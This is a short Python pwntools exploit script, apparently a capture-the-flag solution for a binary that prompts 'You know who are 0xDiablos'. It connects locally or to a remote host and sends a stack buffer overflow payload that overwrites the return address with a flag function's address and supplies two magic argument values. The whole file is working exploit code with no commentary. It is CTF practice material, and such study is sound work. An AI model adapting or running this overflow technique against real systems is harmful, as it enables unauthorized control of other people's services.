import sys
import logging
from time import sleep
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###
func_flag = 0x80491e2
func_main = 0x80492b1

    ###main###
def main():
    ###payload###
    payload = b"A" * 188
    #payload += p32(func_main)
    payload += p32(func_flag)
    payload += b"B" * 0
    payload += p32(0xc0ded00d)
    payload += p32(0xdeadbeef)
    
    _ = target.recvuntil("You know who are 0xDiablos:")
    target.sendline(payload)

    print(target.recvline())
    print(target.recvline())
    sleep(0.1)
    print(target.recvline())
    #print(target.recvline())
    #target.interactive()
    
if __name__ == "__main__":
    main()
